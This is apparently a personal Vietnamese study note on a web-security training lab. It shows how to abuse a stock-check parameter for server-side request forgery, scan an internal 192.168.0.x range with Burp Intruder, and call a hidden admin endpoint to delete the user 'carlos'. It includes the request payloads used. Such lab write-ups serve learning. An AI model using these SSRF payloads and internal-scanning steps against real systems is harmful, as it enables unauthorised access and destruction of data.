![[lab-ssrf-backend-scan.png]]
quét dải 192.168.0.x qua stockApi để lòi ra server admin ẩn

> [!NOTE] phân tích đề
> - vẫn là stockApi fetch hộ
> - nhưng admin không nằm ở localhost nữa
> - nằm ở dải 192.168.0.x port 8080
> - IP random mỗi lần mở lab, ví dụ hay gặp .42
> -sau khi quan sát gói tin stockApi này, mình thấy backend nằm dải 192.168.0.x mà mình không biết con nào sống, nên mình brute từng IP .1 -> .254 rồi soi con nào trả 200 khác biệt.
> -> đọc thêm ở [[dạng SSRF lấy dữ liệu từ backend system-internal system]] và [[lys thuyet SSRF]]

### hướng giải
- [ ] bắt request Check stock
- [ ] quăng qua Intruder
- [ ] đặt stockApi=http://192.168.0.§1§:8080/admin
- [ ] payload Numbers 1-255 step 1
- [ ] sort Status, tìm con 200 duy nhất
- [ ] quăng con đó qua Repeater để xóa carlos

### giải
request mẫu:
```http
POST /product/stock HTTP/1.1
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.1:8080/admin
```

cho Intruder chạy 1-255
-> hầu hết trả timeout / lỗi / 500
-> lòi ra 1 con, ví dụ:
```
http://192.168.0.42:8080/admin -> 200 OK
```
-> response có HTML admin

đọc HTML thấy:
```html
<a href="/admin/delete?username=carlos">Delete</a>
```

bắn tiếp:
```http
stockApi=http://192.168.0.42:8080/admin/delete?username=carlos
```
=> carlos bị xóa
=> lab solved

![[lab-ssrf-backend-scan-result.png]]

> [!NOTE] bài học
> - SSRF + Intruder = scanner mạng nội bộ
> - Status khác biệt là dấu hiệu có host sống
> - nên mình luôn sort theo Status / Length khi scan
> - lab này nối sang [[Lab-SSRF open redirect bypass]] khi bị chặn host lạ
